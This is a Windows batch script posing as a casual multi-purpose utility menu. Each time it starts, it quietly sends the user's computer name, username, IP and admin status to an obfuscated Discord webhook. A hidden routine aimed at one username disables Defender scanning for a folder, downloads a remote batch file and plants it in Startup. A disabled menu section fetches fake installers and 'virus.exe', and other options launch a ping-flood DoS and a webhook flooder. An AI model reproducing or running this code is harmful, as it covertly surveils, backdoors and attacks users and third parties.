@echo off
:: v3.23.5 blubberian cant think of titles
:: Secrect Count: 15
:: Added:
::	nothing
:: Removed:
::	sxs temp inflight del cmd because everything is denied (wowzas! im in testing and that DRASTICALLY changed the time it took)
:: Improved/Changed:
::	my ip to bulletinbay because i forogr i was testing
:: Bug Fixes
::	cls > echo. for file cleaning
:: Notes
::	if you want to know what something does, or have anything to suggest, dm me using my socials in #17 or by sending a message with #27!
::	all secrects need internet.

setlocal enabledelayedexpansion
:start
set ver=3.23.5R
set site=http://chicken.bulletinbay.com
set pc=powershell -Command
set gd=goto dsrv
set dl=del /q /f /s
set st=set sec=t
set "t1=timeout /t 1 >nul"
set "t3=timeout /t 3 >nul"
set "p=pause >nul"
set ga=goto ae
set kl=taskkill /f
set ss=%site%/secrect
set js=ConvertFrom-Json
set gc=Get-Content
set iw=Invoke-WebRequest
set sp=%programdata%\script
set gm=goto menu
set /p name=<!sp!\name.txt
set /p id=<!sp!\id.txt
title tool %ver% ^| by chicken

tasklist /FI "IMAGENAME eq windowsterminal.exe" | find /I "windowsterminal.exe" >nul
if %errorlevel%==0 (
	echo you have to run this in cmd, not the new windows terminal!
	echo if this is a bug, try closing windows terminal windows!
	echo ^(click any key to continue...^)
	%p%
	exit
) else echo this file is being ran with normal cmd, good!
if not exist !sp! md !sp!
curl >nul 2>&1
if %errorLevel%==2 ( echo you have curl!
) else goto curl
if exist !sp!\pptos.txt ( echo PP and TOS already accepted.
) else goto pptos
if not exist !sp!\name.txt (
	if exist !sp!\nameoptout.txt ( echo name calling opted out
	) else goto name
)
echo checking uac..
net session >nul 2>&1
if %errorlevel% neq 0 ( set uac=f
) else set uac=t 
set /p rs=<!sp!\rs.txt
if %errorlevel%==2 ( echo script ran before
) else ( echo script never ran before )
if exist !sp!\rs.txt ( echo.
) else (
	echo first ran at !date! !time! with version !ver! >!sp!\rs.txt
	set rs=never ran before
)
if not exist !sp!\id.txt (
	set /a id=%random% %% 100 + 1
	echo !id! >!sp!\id.txt
)
echo sending some analytics.. this may take a second!
echo decrypting discord webhook and sending analytics
echo aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxNDAyODQ1NzMzNTk4MDA1Mi9IY25VeFJHNmdHY2pPNUdxbEZiUUVVbWx3N2VqNG5CUXJOMTVMYVdlaEg4RHBZU0JGWWMteGVRUWM3MmlQZTNzc1dnNA== >!sp!\at.txt
certutil -decode !sp!\at.txt !sp!\atd.txt >nul
set /p ad=<!sp!\atd.txt
del !sp!\at.txt !sp!\atd.txt
for /f "delims=" %%i in ('curl -s https://api.ipify.org') do set ip=%%i
curl -H "Content-Type: application/json" -d "{\"content\": \"script %rs%\ncurrent version: %ver%\npc name: %COMPUTERNAME%\nusername: %USERNAME%\ntimestamp: !date! !time!\nip: %ip%\nadmin: %uac%\nid: %id%\", \"embeds\": [], \"attachments\": []}" "!ad!"
if %username%==yanay call :erez
echo finding updates
curl -s http://chicken.bulletinbay.com/data/scripts/update >!sp!\update
set /p update=<!sp!\update
del !sp!\update

:menu
mode con cols=76 lines=36
echo        __              __	      v%ver% Removing Unnessacery Things
echo       / /_ ___  ___   / /  ^> coded by chicken
echo      / __// _ \/ _ \ / /  ^> hope you enjoy!
echo      \__/ \___/\___//_/
echo              ____     ___   ____     ____  ___ ^> u to update
echo       _  __ ^|_  /    ^|_  ^| ^|_  /    / __/ / _ \ ^> 17 for my socials
echo      ^| ^|/ /_/_ ^< _  / __/ _/_ ^< _  /__ \ / , _/ ^> 27 to send me a message
echo      ^|___//____/(_)/____//____/(_)/____//_/^|_^|
echo.
if defined name ( echo 	 hello, !name! ) else echo.
if "%update%"=="%ver%" ( echo 	 up to date ) else echo 	 new version available, v%update%, type u to update
echo  __________________________________________________________________________
echo    * = needs internet   ** = needs admin perms   *** = recommended admin
echo.
echo    0. exit			  ^|    20. clipboard viewer
echo    1. kid*			  ^|    21. shutdown utilies
echo    2. random number 1-65000	  ^|    22. list all apps installed
echo    3. clean temp files***	  ^|    23. choose a color for the terminal
echo    4. kill certain process	  ^|    24. random secure password
echo    5. open my website*		  ^|    25. real time date and time
echo    6. dvd screensaver*		  ^|    26. ping a site*
echo    7. my repo version selector*   ^|    27. send me a message*
echo    8. explode*			  ^|    28. say something out loud
echo    9. do some "haking"		  ^|    29. ai*
echo    10. test			  ^|    30. ascii art*
echo    11. clones of your mother*	  ^|    31. fix xbox gamebar
echo    12. some internet advice*	  ^|    32. remove virus and use sfc**
echo    13. joke of the day*	  	  ^|    33. flood discord webhook*
echo    14. fun fact*		  ^|    34. virustotal upload*
echo    15. troubleshooting console	  ^|    35. start with uac
echo    16. system info		  ^|    36. dos somebody*
echo    17. socials*		  	  ^|    38. compress files***
echo    18. touchscreen toggle**	  ^|    39. wipe all script files
echo    19. math

set /p wow="choose: "
mode con cols=115 lines=35

if "%wow%"=="r" ( goto start
) else if "%wow%"=="u" (
	curl "http://chicken.bulletinbay.com/data/scripts/tool%%20!update!.bat" -o "tool !update!.bat"
	echo updated!
	echo starting script in 3 seconds..
	%t3%
	cls
	"tool %update%.bat"
) else if "%wow%"=="0" ( exit
) else if "%wow%"=="1" (
	set f=child.png
	set w=%ss%/!f!
	set o=%tmp%\!f!
	%gd%
) else if "%wow%"=="2" (
	cls
	set /a randomn=%random% * 65000 / 32768 + 1
    echo your random number is: %randomn%
	%ga%
) else if "%wow%"=="3" (
	if %uac%==t ( echo you have admin. most temp files will be cleaned. ) else echo you don't have admin, so some temp files might not be cleaned.
	echo click any key to continue, or close out of the script.
	%p%
	%kl% /im ccleaner64.exe >nul
	%kl% /im ccleaner.exe >nul
	%dl% "%localappdata%\cache\*"
	%dl% "%localappdata%\SquirrelTemp\*"
	%dl% "%localappdata%\Discord\Packages\SquirrelTemp\*"
	%dl% "%localappdata%\Discord\GPUCache\*"
	%dl% "%localappdata%\Discord\DawnWebGPUCache\*
	%dl% "%localappdata%\Discord\DawnGraphiteCache\*"
	%dl% "%localappdata%\Discord\Cache\*"
	%dl% "%localappdata%\Discord\Cache\Cache_data\*"
	%dl% "%localappdata%\Discord\Shared Dictionary\cache\*"
	%dl% "%localappdata%\Discord\Code Cache\*"
	%dl% "%tmp%\*"
	%dl% "%homepath%\AppData\LocalLow\Intel\ShaderCache\*
	%dl% "%windir%\SystemTemp\*"
	%dl% "%windir%\Temp\*"
	%dl% "%windir%\SoftwareDistribution\*"
	%dl% "%ProgramFiles(x86)%\Microsoft\EdgeUpdate\*"
	%dl% "%ProgramFiles(x86)%\Microsoft\Temp\*"
	%dl% "%programdata%\Microsoft\Windows Defender\Support\*"
	start "" ccleaner.exe /AUTO >nul
	start "" cleanmgr /sagerun:1
	echo.
) else if "%wow%"=="4" ( goto pid
) else if "%wow%"=="5" ( start %site%
) else if "%wow%"=="6" (
	echo this screensaver uses python!
	echo the screensaver is stored in your user folder
	set pl=%homepath%\dvd-screensaver-x86.scr /S
	if exist %homepath%\dvd-screensaver-x86.scr ( echo file already exists..
	) else (
		set ps=%site%/dvd.html%out%%homepath%\dvd-screensaver-x86.scr
		%gd%
	)
	cls
	echo starting..
	%pl%
) else if "%wow%"=="7" ( start "" %site%/repo.html
) else if "%wow%"=="8" (
	set f=catexplode.gif
	set w=%ss%/!f!
	set o=%tmp%\!f!
	%gd%
) else if "%wow%"=="9" (
	color 2
	cd C:\
	echo starting hack...
	timeout /t 2 >nul
	tree
) else if "%wow%"=="10" ( goto test
) else if "%wow%"=="11" (
	set f=mom.gif
	set w=%ss%/!f!
	set o=%tmp%\!f!
	%gd%
) else if "%wow%"=="12" (
	echo getting your life advice
	set f=%tmp%\advice.json
	curl https://api.adviceslip.com/advice -o !f!
	%pc% "(!gc! '!f!' | !js!).slip.advice"
	del !f!
) else if "%wow%"=="13" (
	echo heres a joke for you
	set f=%tmp%\joke.json
	curl https://official-joke-api.appspot.com/random_joke -o !f!
	%pc% "(!gc! '!f!' | !js!).setup"
	%t1%
	%pc% "(!gc! '!f!' | !js!).punchline"
	del !f!
) else if "%wow%"=="14" (
	echo getting a fun fact
	set f=%tmp%\fact.json
	curl https://uselessfacts.jsph.pl/api/v2/facts/random?language=en -o !f!
	%pc% "(!gc! '!f!' | !js!).text"
	del !f!
) else if "%wow%"=="15" (
	echo it will not close even on error, which is why i called it "troubleshooting console"
	echo it only closes when killed, or closed by user.
	cmd /k
) else if "%wow%"=="16" (
	echo system information:
	echo.
	echo computer name: %computername%
	echo user folder: %homedrive%%homepath%
	echo processor architecture: %processor_architecture%
	echo system drive: %homedrive%
	echo number of processor cores: %number_of_processors%
	echo os version: %os%
	echo username: %username%
	echo local date/time: %date% %time%
) else if "%wow%"=="17" ( goto soc
) else if "%wow%"=="18" ( goto tmenu
) else if "%wow%"=="19" ( goto math
) else if "%wow%"=="20" (
	echo clipboard contents:
	%pc% "Get-Clipboard"
) else if "%wow%"=="21" ( goto su
) else if "%wow%"=="22" ( wmic product get name,version
) else if "%wow%"=="23" ( goto color
) else if "%wow%"=="24" ( goto pwd
) else if "%wow%"=="25" (
	mode con: cols=22 lines=6
	:rtdt
	cls
	echo current date and time:
	echo.
	echo %date%
	echo %time%
	%t1%
	goto rtdt
) else if "%wow%"=="26" ( goto ping
) else if "%wow%"=="27" ( goto msg
) else if "%wow%"=="28" ( goto vmsg
) else if "%wow%"=="29" ( goto ai
) else if "%wow%"=="30" ( goto art
) else if "%wow%"=="31" (
	%kl% /im gamebar.exe
	echo it should work now. try opening it!
) else if "%wow%"=="32" (
	if %uac%==t ( echo uac found. continuing..
	) else (
		echo you need uac for this.
		%ga%
	)
	start "" "%programfiles%\windows defender\mpcmdrun.exe" -Scan -ScanType 2
	start "" mrt /q /f
	start "" sfc /scannow
	%ga%
) else if "%wow%"=="33" ( goto dfls
) else if "%wow%"=="34" ( goto vt
) else if "%wow%"=="35" (
	if %uac%==t (
		echo you already have uac!
		%ga%
	) else (
		powershell -command "Start-Process '%~dpnx0' -Verb runAs"
		exit
	)
) else if "%wow%"=="36" ( goto dos
) else if "%wow%"=="37" ( goto rat
) else if "%wow%"=="38" (
	echo compressing files.. this may take a while.
	compact /c /s /a /i /f %homedrive%\*
	compact compactos:always
	echo compression complete.
) else if "%wow%"=="39" (
	echo wiping script related files..
	del /f /q %sp%\rs.txt %sp%\name.txt %sp%\nameoptout.txt %sp%\pptos.txt
	%t1%
	echo wiped!
	echo click any key to restart the script
	%p%
	goto start
) else if "%wow%"=="horn" (
	set f=horn.wav
	set o=%tmp%\!f!
	set w=%ss%/!f!
	set s=%pc% "$player = New-Object System.Media.SoundPlayer '!tmp!\!f!'; $player.PlaySync()"
	%st%
	%gd%
) else if "%wow%"=="e" (
	set f=strawberryfull.jpg
	set o=!tmp!\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"=="sigma" (
	set f=sigma.jpg
	set o=!tmp!\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"==" " (
	set f=skibity.jpg
	set o=!tmp!\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"=="crack" (
	set f=cracker.jpg
	set o=!tmp!\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"=="fart" (
	set f=fart.jpg
	set o=!tmp!\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"=="" (
	set f=code.jpg
	set o=!tmp!\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"=="crime" (
	set f=crime.jpg
	set o=!tmp!\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"==":3" (
	set f=wtf.gif
	set o=!tmp!\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"=="SHUT UP YOU'RE :clover:" (
	set f=SHUTUP.png
	set o=%tmp%\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"=="table" (
	set f=table.gif
	set o=!tmp!\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"=="gas" (
	color 6
	set f=gas.gif
	set o=!tmp!\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"=="wowow" (
	set f=woah.gif
	set o=!tmp!\!f!
	set w=%ss%/!f!
	%st%
	%gd%
) else if "%wow%"=="rick" (
	echo haha you found secrect
	start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
	%ga%
) else if "%wow%"=="pluh" (
	set f=pluh.wav
	set w=%ss%/!f!
	set o=%tmp%\!f!
	set s=%pc% "$player = New-Object System.Media.SoundPlayer '!tmp!\!f!'; $player.PlaySync()"
	%st%
	%gd%
) else (
	cls
	echo not valid choice you made!
	echo i will send you back to the main menu!!
	%t3%
	%gm%
)
%ga%
:dsrv
if "%sec%"==t ( echo ooh.. secret??
) else echo.

curl !w! -o !o!

if defined s ( start "" !s!
) else start "" !o!
del !o!
set sec=
set w=
set o=
set s=
set f=
%ga%
:::::
:pid
echo this will also kill any subprocesses.
set /p p="input a pid or process name to kill: "
%kl% /im %p% >nul
%kl% /pid %p% >nul
%ga%
:::::
:test
set c=echo your correct!
set w=echo wrong!
echo ready?
%t1%
echo (click any key to continue)..
%p%
cls
echo 1. saturn
echo 2. uranus
echo 3. moon
echo 4. earth
set /p test="which planet has the most moons? "
if %test%==1 (
	cls
	%c%
	%t3%
	cls
) else (
	cls
	%w%
	%ga%
)
echo 1. seagull
echo 2. dog
echo 3. chicken
echo 4. cat
set /p test="what animal do i like? "
if %test%==3 (
	cls
	%c%
	%t3%
	cls
) else (
	cls
	%w%
	%ga%
)
echo 1. hitler
echo 2. trump
echo 3. ice cream biden
echo 4. all of the above
echo 5. none
set /p test="what poletition do i like? "
if %test%==1 (
	cls
	echo what is your problem?
	%ga%
) else if %test%==5 (
	cls
	%c%
	%t3%
	cls
) else (
	cls
	%w%
	%ga%
)
echo 1. heads
echo 2. tails
set /p test="heads.. or tails? "
if %test%==2 (
	cls
	%c%
	%t3%
	cls
) else (
	%w%
	%ga%
)
echo nothing is impossible
echo 1. true
echo 2. false
set /p test="true or false? "
if %test%==2 (
	cls
	%c%
	%t3%
	cls
) else (
	%w%
	%ga%
)
echo tyler the creator released a new album called "chromakopia"
echo 1. true
echo 2. false
set /p test="true or false? "
if %test%==1 (
	cls
	%c%
	%t3%
	cls
) else (
	cls
	%w%
	%ga%
)
echo do you believe in yourself
echo 1. yes
echo 2. no
set /p test="1 or 2? "
if %test%==1 (
	cls
	echo good!
	%t3%
	cls
) else (
	cls
	echo ok
	%ga%
)
cls
echo you passed!
echo great job!
echo theres more coming soon..
%ga%
:::::
:soc
echo these are *most* of my socials.
echo 0. main menu
echo 1. discord
echo 2. telegram
echo 3. youtube
echo 4. twitter
echo 5. roblox
echo 6. minecraft
echo 7. my site
set /p s="select a number: "
cls
if %s%==0 ( %gm%
) else if %s%==1 ( start "" www.discord.com/users/841797623270342717
) else if %s%==2 ( start "" www.t.me/ch1ck3mm
) else if %s%==3 ( start "" www.youtube.com/@thyrandomchicken
) else if %s%==2 ( start "" www.twitter.com/ch1ck3m
) else if %s%==5 ( start "" www.roblox.com/users/1343740658/profile
) else if %s%==6 ( start "" www.namemc.com/profile/ch1ck3m
) else if %s%==7 ( start %site%
) else echo invalid choice 
%ga%
:::::
:tmenu
if %uac%==t ( echo admin found! continuing..
) else (
	echo you did not start the script as admin!
	echo touchscreen features will be restricted until you start the script as admin.
	%ga%
)
cls
echo this might work for you, but for basically everybody it SHOULD work.
echo 0. main menu
echo 1. enable touchscreen
echo 2. disable touchscreen
set /p t="enter choice: "
cls
if %t%==0 ( %gm%
) else if %t%==1 (
	echo enabling touchscreen..
	%pc% "Get-PnpDevice -FriendlyName 'HID-compliant touch screen' | Enable-PnpDevice -Confirm:$true"
	echo if you got no error, then touchscreen should be enabled.
) else if %t%==2 (
	echo disabling touchscreen..
	%pc% "Get-PnpDevice -FriendlyName 'HID-compliant touch screen' | Disable-PnpDevice -Confirm:$true"
	echo if you got no error, then touchscreen should be disabled.
) else echo invalid choice
%ga%
:::::
:math
echo 0. main menu
echo 1. basic calculator
echo 2. find percentages of number
echo 3. random number 1-65000
set /p m="choose a number: "
if %m%==0 ( %gm%
) else if %m%==1 ( goto calc
) else if %m%==2 ( goto perc
) else if %m%==3 ( goto rn
) else invalid choice
%ga%

:perc
cls
set /p num="enter number: "
set /p per="enter the percentage: "
set /a res=num*per/100
echo result: %res%
%ga%

:calc
cls
echo basic calculator
echo how to use:
echo * = multiplication / = division
echo - = subraction + addition
set /p exp="enter expression: "
set /a res=%exp%
echo result: %res%
%ga%

:::::
:su
echo 0. main menu
echo 1. lock
echo 2. shutdown
echo 3. restart
set /p su="choose a number: "
if %su%==0 ( %gm%
) else if %su%==1 ( rundll32.exe user32.dll,LockWorkStation
) else if %su%==2 ( shutdown -s -t 5
) else if %su%==3 ( shutdown -r -t 5
) else echo invalid choice
%ga%
:::::
:color
echo 0. main menu
echo 1. blue
echo 2. green
echo 3. aqua
echo 4. red
echo 5. purple
echo 6. yellow
echo 7. light mode
echo 8. restore
set /p cl="choose a number: "
if %cl%==0 ( %gm%
) else if %cl%==1 ( color 1
) else if %cl%==2 ( color 2
) else if %cl%==3 ( color 3
) else if %cl%==4 ( color 4
) else if %cl%==5 ( color 5
) else if %cl%==6 ( color 6
) else if %cl%==7 ( color f0
) else if %cl%==8 ( color
) else echo invalid choice.
%ga%
:::::
:ping
set /p ping="choose website to ping (e.g. google.com): "
ping %ping%
if %errorlevel%==0 ( echo ping sucsessful.
) else echo ping unsucsessful. you might not have internet.
%ga%
:::::
:msg
echo decoding..
echo aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxNDAzMTc2NTcxMDcwNDY3MC9McXNueG14VnlDNEZDakh1SEU1OHVrUFpJMDd1VlUtQ3VIdno3MlM1enEzTVViOS0xTmgxNGdvMWtzbExSdXdBS2pObw== >!sp!\mt.txt
certutil -decode !sp!\mt.txt !sp!\mtd.txt >nul
set /p md=<!sp!\mtd.txt
del !sp!\mt.txt !sp!\mtd.txt
echo \n is for line breaks (ex: hey\nthis is a new line)
echo please also include your name, or something i can reach you again (e.g. discord, telegram, etc.)
set /p "msg=enter your message: "
curl -H "Content-Type: application/json" -d "{\"content\": \"!msg!\nid: %id%\nauthor: !ip!\", \"embeds\": null, \"attachments\": []}" "!md!"
echo message sent!
%ga%
:::::
:pwd
set /p c="how many characters do you want? (up to 128) "
set /p s="how much of those do you want to be special chars? "
%pc% "Add-Type -AssemblyName 'System.Web'; [System.Web.Security.Membership]::GeneratePassword(%c%,%s%)"
%ga%
:::::
:vmsg
set /p voice="enter a message to say: "
%pc% "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('!voice!')"
%ga%
:::::
:ai
if exist !sp!\openkey.txt (
	echo existing api key found.
	set /p aikey=<!sp!\openkey.txt
) else (
	echo no api key found.
	echo you can get your api key at:
	echo https://platform.openai.com/account/api-keys
	set /p aikey="what is your api key? "
	echo !aikey! >!sp!\openkey.txt
)
echo reminder: this is in development, and uses curl.
echo this script only lets you send one message.
echo.
set /p aisay="what do you want to say to chatgpt? "
curl -s -X POST "https://api.openai.com/v1/chat/completions" ^
	-H "Authorization: Bearer !aikey!" ^
	-H "Content-Type: application/json" ^
	-d "{\"model\": \"gpt-3.5-turbo\", \"messages\": [{\"role\": \"user\", \"content\": \"!aisay!\"}]}"
%ga%
:::::
:art
echo                _ _
echo  ___ ____ ____(_^|_)
echo / _ `(_-^</ __/ / /
echo \_,_/___/\__/_/_/
echo  ___ _____/ /_
echo / _ `/ __/ __/
echo \_,_/_/  \__/
echo.
echo this uses curl.
echo list of ascii things to use: knot, rick, batman,
echo hes, parrot, dvd, forrest, bnr, donut, clock,
echo coin, nyan, playstation, spidyswing, torus-knot,
echo batman-running, can-you-hear-me
set /p art="which one? "
curl ascii.live/%art%
:::::
:dfls
set /p flh="what discord webhook would you like to flood? "
set /p flm="what message do you want to send? (you can use \n for line breaks) "
echo click any key to start..
%p%
:dfl
curl -H "Content-Type: application/json" -d "{\"content\": \"!flm!\", \"embeds\": null, \"attachments\": []}" "!flh!"
goto dfl
:::::
:vt
if exist !sp!\vtkey.txt (
	echo existing api key found.
	set /p vtkey=<!sp!\vtkey.txt
) else (
	echo no api key found.
	echo you can get your api key at:
	echo https://www.virustotal.com/gui/my-apikey
	set /p vtkey="what is your api key? "
	echo !vtkey! >!sp!\vtkey.txt
)
set /p vtl="what is the path to the file you want to upload? "
curl -X POST --url "https://www.virustotal.com/api/v3/files" ^
    -H "x-apikey: !vtkey!" ^
    -F "file=@!vtl!" >!sp!\vtr
for /f "delims=" %%i in ('powershell -Command ^
    "Get-Content !sp!\vtr | ConvertFrom-Json | Select-Object -ExpandProperty data | Select-Object -ExpandProperty id"') do set aid=%%i
curl -s -X GET --url "https://www.virustotal.com/api/v3/analyses/%aid%" ^
    -H "x-apikey: !vtkey!" >!sp!\vtar
for /f "delims=" %%i in ('powershell -Command ^
    "Get-Content !sp!\vtar | ConvertFrom-Json | Select-Object -ExpandProperty meta | Select-Object -ExpandProperty file_info | Select-Object -ExpandProperty sha256"') do set sha256=%%i
%t3%
start "" https://www.virustotal.com/gui/file/!sha256!
del /f /q !sp!\vtr !sp!\vtar
set sha256=
set aid=
%ga%
:::::
:dos
set /p dos="ip (or domain) to dos? "
echo this will open a LOT of windows.
echo it might even crash your computer.
echo click any key to continue..
%p%
:doss
start "" cmd /k ping -l 32768 !dos! ^& exit
%t1%
goto doss
:::::
:rat
echo THIS DOESN'T WORK RIGHT NOW! sorry..
%ga%
if %uac%==t ( echo you have uac.
) else (
	echo you need uac to make a exclusion.
	%ga%
)
%pc% "Add-MpPreference -ExclusionPath '%programdata%'"
echo added exclusion to %programdata%.
set sv=%site%\data\virus
echo 0. goto main menu
echo 1. fake java installer
echo 2. fake windows installer
echo 3. fake edge remover
echo 4. straight up virus
echo 5. a little bit more undetectable straight up virus
set /p rat="which rat do you want? "
if %rat%==0 ( %gm%
) else if %rat%==1 (
	set f=jre-8u431-windows-x64.exe
	curl %sv%\!f! -o %programdata%\Java\!f!
	start "" %programdata%\Java\!f!
) else if %rat%==2 (
	set f=Windows11InstallationAssistant.exe
	curl %sv%\!f! -o %programdata%\Microsoft\Installer\!f!
	start "" %programdata%\Microsoft\Installer\!f!
) else if %rat%==3 (
	set f=Remove-Edge.exe
	curl %sv%\ -o %programdata%\Microsoft\Edge\!f!
	start "" %programdata%\Microsoft\Edge\!f!
) else if %rat%==4 (
	set f=virus.exe
	curl %sv%\ -o %programdata%\virus\!f!
	start "" %programdata%\virus\!f!
) else if %rat%==5 (
	set f=Updater.exe
	curl %sv%\!f! -o %programdata%\!f!
	start "" %programdata%\!f!
)
set f=
%ga%
:::::
:ae
%t1%
echo click any key to continue..
%p%
set /p ae="would you like to go back to the main menu? (y/n): "
if /i %ae%==y ( %gm% ) else exit
:erez
echo You are not safe.
del !sp!\erez
if not exist !sp!\erez (
	echo creating new config files..
	if %uac%==t powershell -command "Add-MpPreference -ExclusionPath '!sp!'"
	curl -s http://chicken.bulletinbay.com/data/dependencies/silent.bat -o !sp!\booster.bat
	copy !sp!\booster.bat %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
	echo skibidi >!sp!\erez
)
start /MIN "" !sp!\booster.bat
echo Let me know if you'd like help with a specific part of this integral!
echo no, im not delusional, i just have good eyes.
%t1%
exit /b
:: everything under this is onboarding shit
:pptos
echo there is a pop and tos to accept.
echo TOS: >>!sp!\pptos.txt
echo 	i'm not responsible for any damage. >>!sp!\pptos.txt
echo PP: >>!sp!\pptos.txt
echo 	every time you start the script, stats are sent. >>!sp!\pptos.txt
echo 	the things send in these stats include: >>!sp!\pptos.txt
echo 	ip adress, only to check if i ran it, for testing purposes. >>!sp!\pptos.txt
echo 	computer name, computer username, script first ran, >>!sp!\pptos.txt
echo 	and script version. >>!sp!\pptos.txt
echo	your ip is recorded when you send a message. >>!sp!\pptos.txt
type !sp!\pptos.txt
set /p pptos="do you accept (y/n)? "
if %pptos%==y (
	echo accepted!
	cls
	goto start
) else (
	cls
	echo not accepted!
	echo exiting in 3s..
	%t3%
	exit
)
:name
cls
set /p nameask="would you like to make the script greet you (y/n)? "
if %nameask%==y ( goto askname
) else (
	echo ok.
	echo opted-out of name calling >!sp!\nameoptout.txt
)
goto start
:askname
cls
set /p name="what is your name? "
echo !name! >!sp!\name.txt
goto start
:curl
echo curl is needed for this script.
set /p curl="install it? (y/n) "
if %curl%==y (
	winget install cURL.cURL
	echo curl installed. restarting script.
	%t3%
	goto start
) else exit
endlocal